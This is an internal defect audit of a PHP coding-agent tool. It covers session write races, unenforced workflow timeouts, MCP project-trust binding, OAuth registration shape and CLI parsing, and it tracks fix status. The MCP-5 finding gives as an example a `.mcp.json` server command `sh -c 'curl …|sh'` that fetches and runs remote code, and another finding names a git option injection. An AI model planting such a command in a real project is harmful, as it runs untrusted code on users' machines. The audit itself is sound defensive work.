# 15e — Defect audit: agents, sessions, MCP, CLI (sugar-crush)

Scope: `src/Agents/`, `src/Workflows/`, `src/Session*`, `src/Sessions/`, `src/MCP/` (+ `sugar-mcp` transport it delegates to), `src/ClaudeCodeMcpClient.php`, `src/Cli/`, `bin/`.
Baseline excluded: everything in `99-synthesis.md` Part II (not re-reported).
Status: **FINAL.** Sections A–D are from the first pass. Sections E–H were added when the audit resumed. What was read, what was only skimmed, and how each open lead was settled is listed under **Coverage** at the end.

Repro scripts live in `/home/sites/crush-research-repos/_audit-scratch/15e/` (each named per finding below). All repros were run against the working tree at 2026-10-01 (PHP 8.3, sugar-mcp symlinked from the monorepo), with a scratch `HOME` (never the real `~/.sugar-crush`). Every server, daemon and child process the repros started was killed afterwards.

---

## A. MCP transports

Both findings here (MCP-3, MCP-4) were fixed in wave 5; see **Fixed since audit**.

---

## B. Sessions and persistence

### SES-3 — No single-writer guard per session: two TUIs on one session (`--continue` twice, or `--resume X` in two terminals) silently clobber each other's transcript and interleave checkpoints
- **Severity:** Medium
- **Confidence:** Verified-by-reading
- **Where:** `src/Session/EnhancedSessionStore.php:872-889` (`INSERT OR REPLACE INTO session_transcripts`), `:469-502` (`SELECT MAX("index")+1` then `INSERT`, outside a transaction, with no UNIQUE(session_id,"index")); `Bootstrap::openSession` `src/Cli/Bootstrap.php:3186-3216`
- **Scenario:** `--continue` in two terminals opens the same newest session. Each TUI rewrites the whole transcript on every history change, and the last writer wins, so terminal A's conversation disappears on the next `--continue`. Both TUIs append checkpoints to the same session, so `/rewind` in A can restore B's state. Concurrent saves can produce duplicate `"index"` values; `getCheckpoint()` then returns an arbitrary one and `restoreCheckpoint()` deletes both.
- **Also (former lead 4, Verified-by-reading; no two-process repro was run):** blobs are per session (`UNIQUE(session_id, hash)`, `:184-193`), so the interning race needs this same two-writers setup. `internMessages()` (`:676-742`) checks `PRAGMA data_version` once (`forgetInternedBlobsIfStale()`) and then trusts its in-memory `hash → id` cache. If the other TUI runs `/rewind` in between, its `collectCheckpointBlobs()` (`:1075-1113`) deletes those ids. The checkpoint or transcript then stores ids whose blob rows are gone, so later loads return the conversation with those messages missing. The per-session lock in the fix below closes this too.
- **Fix:** take an advisory lock per session (a `flock` on `<configDir>/sessions/<id>.lock`, or a `sessions.owner_pid` and `owner_start` column checked at open). When the session is held, refuse, or fork automatically. Add `UNIQUE(session_id,"index")` and wrap index allocation and insert in `BEGIN IMMEDIATE`.
- **Test:** two `EnhancedSessionStore` instances on one DB saving interleaved transcripts; assert a conflict is detected rather than lost. Add a unique-index test for checkpoints.
- **Partly fixed on master in `698a1efff`** (part (a), with SES-2). Checkpoints carry `UNIQUE(session_id, "index")`, and the index is allocated inside a `BEGIN IMMEDIATE` transaction together with the insert. An idempotent migration renumbers existing duplicate indexes and drops the redundant old index. Save, checkpoint and restore each run in one IMMEDIATE transaction, which also closes the blob-intern race described above. **Remaining:** part (b), a per-session writer lock and what a second TUI on the same session should do (refuse, open read-only, or fork), is a deferred decision (wave plan §3 #9). Until then two TUIs on one session still overwrite each other's transcript (last writer wins) and both append checkpoints to it.

---

## C. Background sessions and daemons

Its only finding, TMP-1, was fixed in wave 7; see **Fixed since audit**.

---

## D. CLI / headless

Its only finding, CLI-1, was fixed in wave 3; see **Fixed since audit**.

---

## E. Forked sub-agents (workflows and Task fan-out)

AG-1 to AG-4 have been fixed, the last (AG-2, AG-3) in wave 7; see **Fixed since audit**.

### AG-5 — Two dormant sub-agent paths would now kill their agents at 300 s
- **Severity:** Low (dormant) · **Confidence:** Verified-by-reading (found while fixing WF-1 in wave 4)
- **Where:** the fork path of `Chat::executeAgents()` (`src/Chat.php:7285`; the pool it builds there gets a forked `EngineExecutor` and no time bound) and `App::dispatchSkill()` (`src/App/App.php:910`, `new SubAgent(` at `:960` with no `timeout:`). Both rely on the constructor default `timeout: 300` (`src/Agents/SubAgent.php:66`).
- **Detail:** before WF-1 (a) (`4fa805970`), nothing read `SubAgent::$timeout`, so the default 300 was inert. `AgentWorkerPool` now enforces it on its forking path, so a sub-agent started through either of these paths would be killed with its whole process tree at 300 s and settle `TimedOut`, whatever the configured timeout says. Neither path has a production caller today (`App::dispatchSkill()`'s own comment says so, and nothing in `src/` or `bin/` calls `Chat::executeAgents()`), so nothing breaks yet.
- **Fix:** when either path is wired, give its SubAgents a real budget: the configured timeout (for example `AgentPoolConfig::$defaultTimeoutSeconds`, which `executeAgents()` already passes to its `ProcessExecutor` branch), or `0` for no per-agent bound.
- **Test:** a forked fake executor that outlives a 1 s budget passed through each path settles `TimedOut` at that budget, and one under `timeout: 0` is not killed.

---

## F. Workflows

The baseline item "only the first task of a stage runs" (`WorkflowEngine.php:1069`) was run down and is **not a separate defect**. `executeStage()` and `executePipelineStage()` (`:1185`) take `$tasks[0]` on purpose (comment at `:1067`). No public constructor can build a multi-task `stage`: `WorkflowBuilder::stage()` takes exactly one `TaskBuilder` (`WorkflowBuilder.php:53-60`), and a non-parallel YAML stage yields exactly one task (`WorkflowRegistry.php:1382-1392`). `docs/WORKFLOWS.md:195-203` documents the limit. Only a hand-built `Workflow` can hit it. The real workflow defects are below.

### WF-1 — Workflow and task timeouts and retries are never enforced; a stage has no wall-clock bound at all
- **Severity:** Medium
- **Confidence:** Verified-by-reading. `grep -rn -e '->timeout' src/Agents src/Workflows` finds only the writers and `SubAgent::toArray()` `:125`.
- **Where:**
  - `src/Workflows/WorkflowEngine.php:1094, 1206, 1309, 1352, 1539` set `timeout: $task->timeout ?? 300` and `maxRetries: $task->retries ?? 0` on each `SubAgent`. Nothing reads them.
  - `Workflow::$timeout` (`Workflow.php:32`, parsed from YAML `config.timeout` at `WorkflowRegistry.php:1206-1212`) is read by nothing in the engine.
  - `AgentWorkerPool::waitForCompletion()` `:868-975` waits on `WNOHANG` reaps with no deadline. `EngineExecutor::run()` `:153-215` has none either.
  - `AgentPoolConfig.php:34-49` admits retries are a "DORMANT SEAM".
- **Docs contradicted:**
  - `docs/WORKFLOWS.md:63` (`timeout: 900  # positive int; per-stage seconds`).
  - `:81` (default `timeout: 3600`).
  - `:255-261` (the engine "substitutes … `$task->timeout ?? 300` seconds, `$task->retries ?? 0`", which reads as enforced).
  - The PHP example `:245-246` (`->timeout(600)->retries(1)`).
  - The shipped `examples/workflows/lint-then-fix.yaml:19-20,67` (`config.timeout is the per-stage timeout in seconds`, `timeout: 1800`).
- **Scenario:** a stage whose agent runs a Bash command that never exits (Bash has no timeout, Part II #7) or calls an MCP tool that never answers (Part II #11). The workflow sits in the live pane forever. The author's `timeout: 1800` does nothing, a `retries(1)` task that fails is never retried, and the only way out is killing the TUI.
- **Fix:** enforce `SubAgent::$timeout` in the pool. Record a deadline at dispatch; on expiry, `terminateWorker()` and settle `TimedOut` (the status and `buildStageResult()` mapping already exist). Default it from `Workflow::$timeout` instead of the literal 300. Either implement `maxRetries` in `executeAll()` (re-queue on `isFailure()`) or refuse `retries` at load time and remove it from the docs.
- **Test:** a forked executor that sleeps 10 s, a task with `timeout(1)`; assert a `TimedOut` stage result in under 3 s and that the child is gone.
- **Partly fixed on master in `4fa805970`** (part (a)). `AgentWorkerPool` enforces a per-agent deadline from `SubAgent::$timeout` on its forking path: on overrun `ProcessContainment::killTree()` kills the worker and everything it started, and the agent settles `TimedOut`. A new `withTimeBudget()` bounds a whole `executeAll()`. `WorkflowEngine` passes `Workflow::$timeout` to every stage executor, the per-task fallback is `$task->timeout ?? config.timeout` instead of the literal 300, and the stages of one run share one budget. `docs/WORKFLOWS.md` and `examples/workflows/lint-then-fix.yaml` are corrected (DOC-1 item 2). **Remaining:**
  - (b) retries are deferred (wave plan §3 #10); they are now documented as recorded but not enforced, and `->retries(1)` is gone from the PHP example. The `AgentPoolConfig::$maxRetries` "DORMANT SEAM" note (`src/Agents/AgentPoolConfig.php:34`) stands.
  - The synchronous dispatch paths (an injected executor, no pcntl, or a failed fork) now honour the agent's own timeout (`2b136d35a`, wave 8A: `ProcessExecutor`'s own bound defaults to null and each run is bounded by the earlier of it and the agent's positive `SubAgent::$timeout`, settling `TimedOut`; `EngineExecutor` checks the timeout at its progress and event sinks). What remains is that the pool's run budget (`withTimeBudget()`) still cannot cut short an inline agent that is already running; `docs/WORKFLOWS.md` documents the gap.
  - The cancel path, `AgentWorkerPool::terminateWorker()`, now uses `killTree()` (`2b136d35a`, 15c F-E2).

### WF-4 — While a workflow runs, Chat refuses every slash command, so a live `/workflow pause` or `/workflow status` only gets through after Esc Esc
- **Severity:** Low-Medium · **Confidence:** Verified-by-reading (found while fixing WF-2 in wave 5)
- **Where:** `src/Chat.php:8060-8063`: while `$this->inFlight`, every input starting with `/` except a bare `/exit` or `/quit` goes to `refuseInFlightCommand()` (`:8527`), which posts "commands do not run while a turn is in flight" and keeps the draft.
- **Detail:** since WF-2's fix (`efdfe79f8`), `WorkflowEngine` can pause a live run: the pause file is written at once, the current stage finishes, and the run returns `Paused` before the next stage. `/workflow run` and `/workflow resume` drive the run in a Fiber through `driveWorkflowFiber()`, so the TUI stays responsive, but the run counts as in flight. The TUI therefore refuses the very command that pauses it: a typed `/workflow pause <id>` (or `/workflow status <id>`) mid-run gets the refusal notice, and the only way through is Esc Esc, which cancels the run rather than pausing it. The engine-level pause works and is tested; the TUI cannot reach it.
- **Fix:** let `/workflow pause` and `/workflow status` through `refuseInFlightCommand()`'s gate while the in-flight work is a workflow run, the way `/exit` and `/quit` are let through. Neither rewrites history the run is appending to: pause writes the pause file and status reads state.
- **Test:** a Chat with a workflow run in flight; Enter on `/workflow pause <id>` returns no refusal notice, and the run settles `Paused` after its current stage.

---

## G. MCP configuration trust and OAuth

MCP-6, MCP-7 and MCP-8 were fixed in wave 7; see **Fixed since audit**.

### MCP-5 — Project MCP trust is bound to the root path, not to what `.mcp.json` says: a `git pull` or branch switch that changes a server's `command` runs it at the next launch with no new consent
- **Severity:** Low-Medium (a supply-chain path. The agent-writes-its-own-`.mcp.json` variant is already Part II #9; this one needs no agent)
- **Confidence:** Verified-by-reading
- **Where:** `src/Cli/Bootstrap.php:5808-5895` (`mcpConfigDecision()`: trusted iff the canonical root is listed in `trustedProjectMcp`). A content digest exists (`mcpConfigDigest()` `:6073-6081`, stored at `:6330-6332`), but it only drives the in-session drift notice `mcpConfigChangedSinceLaunch()` `:6047-6061`. It is never compared with anything recorded when trust was granted. Docs: `docs/MCP.md:28-33`, `:49-54`.
- **Scenario:** a user trusts `~/src/proj` for a harmless `npx some-mcp`. A later `git pull` (a teammate's commit, a compromised dependency bump PR, or checking out a contributor's branch to review it) changes `.mcp.json` to `{"command":"sh","args":["-c","curl …|sh"]}`. On the next `sugarcrush` launch in that root, the command runs at startup in every permission mode, and before any tool call. Claude Code re-asks per server when `.mcp.json` changes. Here nothing does.
- **Fix:** store the trusted digest (or a per-server `command+args+env` fingerprint) next to the root in `trustedProjectMcp`. When it differs, refuse to start the changed servers and print the diff, plus a one-line re-trust command.
- **Test:** trust a root, change one server's `args`, rebuild the client; assert that server is refused, the unchanged ones start, and the refusal names the server.

### MCP-10 — Dynamic client registration wraps the client metadata in a `client_metadata` envelope; RFC 7591 sends it at the top level
- **Severity:** Low · **Confidence:** Verified-by-reading (found while fixing MCP-8 in wave 7)
- **Where:** `src/MCP/OAuthClientRegistration.php:91` (`registerClient()`: `'json' => ['client_metadata' => $metadata]`). `tests/MCP/McpAuthStoreLoginTest.php` pins the envelope.
- **Detail:** RFC 7591 §3.1 sends the client metadata (`redirect_uris`, `grant_types`, `client_name`, …) as the top-level members of the registration request's JSON body. A spec-following authorization server reads no `redirect_uris` from the envelope and refuses the registration (`invalid_redirect_uri` or `invalid_client_metadata`), so `sugarcrush mcp auth login` fails against it even now that MCP-6's discovery reaches the registration endpoint.
- **Fix:** send `$metadata` as the body itself, and move the `McpAuthStoreLoginTest` pin with it.
- **Test:** a Guzzle `MockHandler` registration endpoint that asserts `redirect_uris` at the top level of the request body.

---

## H. CLI and docs

### CLI-2 — `sugarcrush <dir>` ignores a bare directory name, and every non-path positional word (a prompt typed without `-p`) is dropped silently
- **Severity:** Low-Medium (the TUI opens rooted in the wrong project, with that project's trust, `.mcp.json` and presets, and nothing says so)
- **Confidence:** Verified-by-repro
- **Where:** `src/Cli/ArgvParser.php:585-592` (a positional becomes the root only if `looksLikePath()`), `:688-691` (`$s[0] === '/' || $s[0] === '.' || strpos($s, '/') !== false`). Every other positional is collected (`:530`) and never read. Help: `src/Cli/Help.php:43` (`sugarcrush <dir>   Start the TUI rooted at <dir>`).
- **Repro (`argv.php`):** `sugarcrush fix the login bug` and `sugarcrush src` both parse to `root=NULL prompt=NULL`, no `usageError` and no unknown flags. The TUI starts in the cwd. `-p hi -- extra` drops `extra`. `--root --model x` takes `--model` as the root (the only value-taking flag without the `looksLikeFlag` guard that `--config`/`--model`/`--permission-mode` have).
- **Fix:** treat a positional that `is_dir()` as the root. Refuse (exit 2) any other leftover positional, with a hint about `-p "<prompt>"`. Alternatively, follow Claude Code and use leftover words as the TUI's initial prompt. Give `--root` the same flag-shaped-value guard as its siblings.
- **Test:** table cases (`src`, `fix the bug`, `--root --model x`) asserting root resolution or a usage error.
- **Partly fixed on master in `b899773a6`** (part (a)). `ArgvParser::parse()` stays pure and keeps leftovers in the new `ParsedArgs::$positionals`; the new `ArgvParser::resolveOperands()` makes a bare positional that is an existing directory the root, and any other leftover, two roots, or a directory plus `--root` exits 2 with a `-p "<prompt>"` / quote-the-prompt hint. `--root` refuses a flag-shaped or missing value. Help, README and the `bin/sugarcrush` raw-argv scan are updated. **Remaining:** (b) using the leftover words as the TUI's initial prompt, the Claude Code behaviour, is not built; it is a deferred decision (wave plan §3 #15), and `ParsedArgs::$positionals` is kept so it can be added later.

---

## Summary table (sorted by severity)

| ID | Severity | Confidence | Title |
|---|---|---|---|
| SES-3 | Medium | Verified-by-reading | No per-session writer lock; two TUIs clobber the transcript; checkpoint index and blob-intern races. Partly fixed (`698a1efff`: `UNIQUE(session_id,"index")`, IMMEDIATE allocation, duplicate-renumbering migration; closes the index and blob-intern races); remaining: (b) writer lock and second-TUI behaviour (deferred decision) |
| WF-1 | Medium | Verified-by-reading | Workflow/task `timeout` and `retries` are never enforced; stages have no wall-clock bound. Partly fixed (`4fa805970`: per-agent deadline with `killTree()`, `withTimeBudget()`, `Workflow::$timeout` reaches every stage); remaining: (b) retries (deferred decision, w8b-wf-retries); the pool's run budget cannot cut short an inline (no-fork) agent already running (`2b136d35a` made inline runs honour the agent's own timeout and the cancel path kill the tree) |
| WF-4 | Low-Med | Verified-by-reading | While a workflow runs, Chat refuses every slash command, so a live `/workflow pause` or `/workflow status` only gets through after Esc Esc (residual of WF-2) |
| MCP-5 | Low-Med | Verified-by-reading | Project MCP trust is path-bound, not content-bound; a pulled `.mcp.json` change runs new commands without consent |
| CLI-2 | Low-Med | Verified-by-repro | `sugarcrush <dir>` ignores bare directory names; non-path positionals silently dropped. Partly fixed (`b899773a6`: existing-dir positional is the root, other leftovers exit 2 with a `-p` hint); remaining: (b) leftovers as the TUI's initial prompt (deferred decision) |
| MCP-10 | Low | Verified-by-reading | Dynamic client registration sends the metadata inside a `client_metadata` envelope instead of at the top level (RFC 7591); found in wave 7 |
| AG-5 | Low (dormant) | Verified-by-reading | Dormant `Chat::executeAgents()` fork path and `App::dispatchSkill()` run SubAgents with the default 300 s timeout, which WF-1 (a) now enforces |

---

## Coverage

**Read end to end:**
- `src/Session/EnhancedSessionStore.php`, `src/Session/SessionStore.php`
- `src/Sessions/BackgroundSupervisor.php`, `src/Sessions/BackgroundSessionRunner.php`
- `src/Agents/SuspendedDelegations.php`, `src/Agents/EngineExecutor.php`, `src/Agents/AgentPresetRegistry.php` (parse/list/load)
- `src/MCP/McpClient.php`, `src/MCP/StdioMcpServer.php`, `sugar-mcp/src/StdioMcpServer.php`, `sugar-mcp/src/McpMessage.php`, `src/MCP/McpRouter.php`, `src/MCP/McpAuthStore.php`, `src/MCP/OAuthPkce.php`, `src/MCP/OAuthLoopbackFlow.php`, `src/MCP/OAuthClientRegistration.php` (storage, refresh and re-registration paths)
- `src/Cli/NonInteractive.php`, `src/Cli/HeadlessPermissionPrompt.php`, `src/Cli/ArgvParser.php`, `bin/sugarcrush`
- `src/Workflows/WorkflowEngine.php`: stage loop `:878-1040`, all four stage executors `:1051-1665`, run/pause/resume/status `:400-760`, interpolation, ids and interrupt handlers `:1900-2258`
- `src/Workflows/WorkflowRegistry.php`: YAML parsing `:1086-1470`
- `src/Workflows/WorkflowBuilder.php`

**Read in part:**
- `src/Agents/AgentWorkerPool.php`: `executeAll`/`executeOne`/`cancel*`/`startAgent`/`runStreaming`/`waitForCompletion`/`idle`, result and progress files, and `makeResultDirPath`/`ensureResultDir` `:378-1020`, `:1197-1430`, `:1700-1707`.
- `src/Agents/AgentManager.php`: `executeAll`/`drain`/`settleAbandoned` and batch grant/prompt resolution `:1581-1860`, plus the `$subAgents` writers.
- `src/Agents/ProcessExecutor.php`: `spawnWorker()` `:576-735` only. It is the no-provider fallback that refuses; the live path is `EngineExecutor`. Its 5 s ready loop busy-spins on a non-blocking `fgets` (a CPU hot loop of at most 5 s). Not filed.
- `src/MCP/GitMcpServer.php`: schemas and `callTool()` dispatch `:290-455`. `src/MCP/GitCommandHandlers.php`: `:620-1100` checked for argv shapes only; every arm shares GIT-1's missing `--` (worktree add/remove also take arbitrary on-disk paths).
- `src/Cli/Bootstrap.php`: `workflowEngine()` `:1453-1540`, `agentManager()` `:1718-1775`, preset loading `:2215-2245`, session open/find `:3150-3216`, MCP trust/decision/digest/client/tools `:5759-6081`, `:6262-6340`, `:6470-6520`, `tools()`/`unfilteredTools()` around `:6900-6930`, `sessionStore()`/retention `:7349-7495`, `ensureDir()` `:8036-8040`.
- `src/Cli/Subcommands.php`: `session list|delete`, `mcp import`, `mcp auth` dispatch.
- `src/Tools/McpToolBridge.php`: `name()`, `sanitize()`, `execute()`.
- `src/ClaudeCodeMcpClient.php`: `:340-520`, `:753-830`.
- `src/Chat.php` workflow handlers `:9454-9830` and the session handlers listed in SES-1/SES-2.
- `src/Diagnostics/RuntimeNoticeSink.php` (code only).
- Docs: `docs/MCP.md` (transports, trust, auth, serving), `docs/WORKFLOWS.md` (whole), `docs/TROUBLESHOOTING.md` MCP section, `docs/PERMISSIONS.md` rules section, `docs/ARCHITECTURE.md` grep for agents/MCP/workflow claims.

**Not audited, with reason:**
- `src/LSP/*`: dormant per the baseline; no live caller.
- `src/Share/*`: a known stub (Part II #35).
- `src/Agents/WorktreeManager.php`, `PathJail.php`, `PathJailConfig.php`, `TeamManager.php`, `Mailbox.php`, `Team*.php`: nothing outside `src/Agents/` constructs them (`grep 'new Mailbox|new TeamManager|new PathJail'`), so they are dormant (baseline §2.6).
- `AgentManager::executeSubAgent()` `:678-940`: no `src/` caller (also noted at `src/Renderer.php:166-167`). AG-4 was found in it later, during the 15a A1 fix, and fixed in `48e9a3f65`.
- `ForeignAgentPresetRegistry.php`: function list only.
- `src/Events/*`: not reached.
- `McpForeignTranslate.php`: used only by `mcp import`, which prints and writes nothing.

**Leads from the checkpoint, settled:**
1. *Only the first task of a stage runs* (`WorkflowEngine.php:1069`): **dropped as a defect.** It is intentional and documented, and no builder or YAML path can produce a multi-task `stage` (see the section F preamble). The real workflow defects are WF-1, WF-2 and WF-3.
2. *`/tmp/sc_pool_<pid>_*` predictable name* (`AgentWorkerPool.php:1368`): **dropped.** The suffix is `bin2hex(random_bytes(8))` (`:1360-1366`), the directory is created 0700 (`:1380-1393`), and files inside are named by sha256 of the agent id.
3. *`callToolByName` first-match across servers*: **dropped.** `McpToolBridge::execute()` `:397-410` calls `McpClient::callTool($serverName, …)` by server, and `callToolByName()` has no caller in `src/` (the bridge docblock `:366-379` records the earlier mis-routing as fixed). The sanitiser is injective (`_XX` escapes), so two servers cannot share a wire name. *Unconfirmed side note:* the escape doubles `_` into `_5F`, and no 64-character cap is applied to wire names. A long `server__tool` pair can exceed the limit OpenAI-style APIs enforce. The default SGLang path does not enforce it, so this was not tested.
4. *Blob intern TOCTOU*: **folded into SES-3.** Blobs are per session, so the race needs the two-writers setup SES-3 already describes.
5. *Daemon inherits the TUI's fds*: **mechanism confirmed, not filed.** `fdleak.php` shows PHP `proc_open` passes every non-CLOEXEC `fopen`/socket fd to the child (SQLite's fd is CLOEXEC and was not inherited). The `/bg` daemon therefore holds copies of TUI sockets and pipes, including the `RuntimeNoticeSink` socketpair and MCP stdio pipes. I could not show user-visible harm: the TUI's `stopMcpServers()` still terminates servers explicitly on exit. The same class was filed in 15a (B3) for the turn fork's frame socket, and fixed there in `53da0a291` (close-on-exec on both ends); the `/bg` daemon's inherited fds are untouched by that fix.
6. *ESC injection through `HeadlessPermissionPrompt::question()`*: **dropped.** Arguments go through `json_encode`, which always escapes C0 controls (ESC becomes `\u001b`). The built-in Ask message is `"Allow {$toolName} to run? …"` (`PermissionGateHook.php:137-139`), and tool names are registry names (MCP names are sanitised to `[A-Za-z0-9_-]`). A ScriptHook's ask text is operator-authored. Residual: `JSON_UNESCAPED_UNICODE` emitted UTF-8 C1 controls (U+009B) raw. Fixed in `e1acd6f0f` (wave 8A, R17): the encoded arguments, the tool name and the ask message go through `Sanitize::visibleControls()` on both the tty question and the no-tty refusal.
7. *`--resume ''` / prefix match* (`Bootstrap::findSession` `:3150-3162`): **dropped.** `--resume ''` and `--resume=` become "no target", which opens the picker (`ArgvParser.php:497-518`). Prefix matching requires a unique match, and an ambiguous prefix reports "no stored session" (wording only). Name resolution's non-determinism is already in SES-2.
8. *Daemon permission mode*: **dropped (by design).** `BackgroundSessionRunner::backend()` `:580-611` passes `consolePermissionPrompt=true`. With stdin `/dev/null`, every Ask is refused with the full refusal text written to the daemon's log (`BackgroundSupervisor.php:254-258` routes stderr to `<ipc>.buffer.log`). The permission mode is whatever the config resolves, which defaults to bypass (Part II #1). The stop gap was BG-1 (fixed since in `0214944fc`; since BG-2's fix a settled session's `.buffer.log` is deleted).

**CLI-1:** confirmed. It was Suspected and is now Verified-by-repro.

**Repro scripts and fixtures** (all in `/home/sites/crush-research-repos/_audit-scratch/15e/`):

| Script(s) | Finding | What it shows |
|---|---|---|
| `rewind.php` | SES-1 | |
| `fork.php` | SES-2 | |
| `blobs.php` | SES-4 | |
| `mcp_everything.php`, `pyserver.py`, `mcp_py.php` | MCP-1 | |
| `mcp_http.php` | MCP-2 | |
| `ccmcp.php` | MCP-3 | |
| `git_handlers.php` + `gitrepo/` | GIT-1, GIT-2 | Recreate `gitrepo/` before re-running GIT-2 |
| `mcp_fork.php`, `fake_mcp_server.php`, `mcp_fork_exit.php`, `fork_http.php`, `ka_server.py` | AG-1 | |
| `preset_list.php` + `presets/` | AG-2 | |
| `wf_pause.php`, `wf_ctx.php` + `wf/home/.sugar-crush/workflows/{three,fan}.yaml` | WF-2, WF-3 | |
| `oauth_discovery.php` | MCP-6 | Network: discovery GET to mcp.notion.com only |
| `oauth_store.php` | MCP-7, MCP-8 | |
| `argv.php` | CLI-2 | |
| `cli_warn.sh` | CLI-1 | |
| `fdleak.php` | lead 5 | |

`ps` after the last run showed no leftover node, python, php, MCP or daemon processes.

---

## Fixed since audit

These findings were fixed on master after the audit. Their sections and table rows were removed; the coverage and repro lists above still name them.

- **MCP-1** stdio MCP sent `[]` for empty maps; official TS/Python SDK servers started with 0 tools — fixed on master in `44ba1a20b` (+ `b80b267f1` for `claude-mcp` tool arguments). Residual: nested empty maps (MCP-9), fixed later in `f84a97364`.
- **MCP-2** Streamable HTTP MCP: no `Accept`, no `Mcp-Session-Id`, no SSE — fixed on master in `72eaf4642`.
- **GIT-1** Git MCP option injection (`gitShow --output=`) and an uncontained per-call `path` — fixed on master in `43fe9cd06`. Residual: checkout and reset cannot take `--end-of-options`.
- **GIT-2** `execGit()` deadlock on more than 64 KiB of stderr; no timeout; env stripped — fixed on master in `4c341ef6a`. Residual: the git timeout cannot be configured from `.mcp.json`.
- **SES-1** `/rewind` kept the undone prompt in history and in the input box — fixed on master in `abd65fd16`. Residual: checkpoints saved before the fix are restored by dropping a trailing user row that matches the restored draft.
- **AG-1** Forked sub-agents shared the parent's MCP pipes, ids and keep-alive sockets — fixed on master in `ea6e178fd` (stdio: process-unique ids, locked exchanges, shared read buffer) and `2d96e2edb` (HTTP: pid-unique ids, fresh connection per process). Residual: parallel agents now serialise their calls to one stdio server, and a lock file per MCP server is left behind if the TUI is killed.
- **AG-4** `AgentManager::executeSubAgent()` swallowed provider errors the way 15a A1 did — fixed on master in `48e9a3f65` (it throws `ProviderResponseException` after the retry loops; the sub-agent ends `STATUS_FAILED` carrying the provider text). `TaskTool::runOnEngine` and the workflow `EngineExecutor` were checked: they go through `EngineBackend`/`Runtime`, which A1 fixed, and are pinned by regression tests.
- **MCP-9** Empty maps nested inside a tool's arguments went on the wire as `[]` — fixed on master in `f84a97364` (new sugar-mcp `ArgumentShape::conform()` walks the arguments against the tool's `inputSchema`; applied in sugar-mcp `StdioMcpServer`, crush `HttpMcpServer` and `ClaudeCodeMcpServer`).
- **CLI-1** Headless JSON stdout was not protected from PHP diagnostics — fixed on master in `0c2bbd0a7` (`display_errors=stderr` is the first statement of `bin/sugarcrush`; `Bootstrap::ensureDir()` reports the `mkdir` reason in its own exception through a handler scoped to the call, because `@` plus `error_get_last()` loses it under a host handler; on the TUI with the 15a C2 log file in place, `display_errors` is 0 and a fatal prints one "details in <log>" line to stderr).
- **SES-2** `forkSession()` copied only the dead legacy tables, so a fork had no transcript, checkpoints or meta and shared its parent's name — fixed on master in `698a1efff` (`EnhancedSessionStore::forkSession()` copies the transcript, checkpoints, blobs (re-keyed to the fork, with checkpoint envelope ids remapped) and meta in one transaction; the fork is named `<name> (branch)`, then `<name> (branch N)`; `getSessionByName()` is deterministic). Still open nearby: the `/fork` background daemon does not load the copied transcript (Part II #30), and a `/fork` docblock still names the old method (15b-33).
- **SES-6** `getMessages()` ordered by `created_at` with no tiebreak — fixed on master in `698a1efff` (folded into SES-2: `ORDER BY created_at, id`).
- **SES-4** Checkpoint blobs were garbage-collected only on `/rewind` — fixed on master in `698a1efff` (`pruneOldCheckpoints()` runs the blob GC, and the GC drops only the deleted ids from the intern cache).
- **SES-5** Checkpoint and meta timestamps mixed local time and UTC — fixed on master in `698a1efff` (checkpoint `created_at` and `last_activity` are written and read as UTC). Residual: rows written in local time before the fix are not converted.
- **MCP-4** One stray non-JSON stdout line aborted the in-flight MCP request — fixed on master in `e97fe5e5b` (sugar-mcp `StdioMcpServer::readResponse()` skips unparseable lines, banners and blank keep-alives alike, and gives up only on EOF or the deadline; an envelope with our id but neither `result` nor `error` fails the call instead of hanging it; the fork-safety fragment recovery is subsumed by the skip).
- **MCP-3** `ClaudeCodeMcpClient::callTool()` gave up after about 1 s, and `initialize` was sent as a notification — fixed on master in `0ed1b0f70` (the 100 × 10 ms poll is replaced by a `stream_select` read, `readFrame()`, that ends on the reply, the deadline, EOF or the child's death; `tools/call` has no total deadline; `initialize` and `tools/list` are bounded at 60 s, `StdioMcpServer::DEFAULT_START_TIMEOUT_SECONDS`, which a new optional `handshakeTimeoutSeconds` constructor argument can override; `initialize` is a real request followed by `notifications/initialized`; a failed handshake or `tools/list` shuts the child down; id matching is strict and a malformed reply to our own id fails fast; `ExchangeLock` and `RequestIdSequence` fork safety are kept). Measured with `ccmcp.php`: before, the call threw after 1.01 s; after, the 3 s operation completes.
- **WF-2** `/workflow pause` could not pause a running workflow, resuming a failed run skipped the failed stage and reported success, and the pause file was never cleared — fixed on master in `efdfe79f8` (one pause-file writer saves only the stages that succeeded; a live run can be paused: the file is written at once, the current stage finishes, and the run returns `Paused` before the next one; resume restores the earlier successful stages, tokens, cost and start time, re-runs the failed stage and deletes the pause file, and a second resume throws `WorkflowNotRunningException`; `getStatus()` checks a live run, then the pause file, then a finished run the engine remembers; Chat's `/workflow resume` runs in a Fiber through `driveWorkflowFiber()`, so it no longer freezes the TUI, and its reply says completed, failed or paused). Pausing a completed run is still allowed: resuming it runs nothing and deletes the file. Still open nearby: the TUI refuses `/workflow pause` while the run is in flight (WF-4).
- **WF-3** `{{agent.results}}` never resolved for a parallel agent, and a run-context key equal to an agent type crashed the stage — fixed on master in `98821a7a2` (results live under a reserved `$context['@results']` key and every stage type writes them, named by the task name, else the stage name, `<stage>_<n>` for a parallel agent (1-based), the step name for a pipeline step, and `<stage>_verifier` for a verifier; parallel results are matched to their agents by SubAgent id, since they come back in completion order; context keys starting with `@` are refused with `InvalidArgumentException`, so the `coder=x` crash is gone, and tokens from agents that ran are kept on a failed stage). Behaviour change: the agent-type alias is gone, so `{{coder.results}}` resolves only for a task named `coder` (nothing in the repository used it).
- **DOC-1** Smaller doc/code drift: TROUBLESHOOTING's startup-ordering advice and the doc halves of WF-1 and WF-3 — fixed on master in three commits: item 2 (WF-1's timeout and retries semantics in `docs/WORKFLOWS.md` and `examples/workflows/lint-then-fix.yaml`) in `4fa805970` (wave 4); item 1 in `bc5c3dd3b` (the ordering paragraph in `docs/TROUBLESHOOTING.md` is rewritten: every entry is attempted, and the error line names the entries that failed; pinned by the new `McpStartupOrderingDocDriftTest`); item 3 in `98821a7a2` (with WF-3: the Interpolation table in `docs/WORKFLOWS.md` is rewritten, with new sections on how results are named and on pause, resume and status). Item 4 had resolved itself earlier. `docs/MCP.md:97-100` made the same stale claim (DOC-2), fixed in `ec0640ee8`.
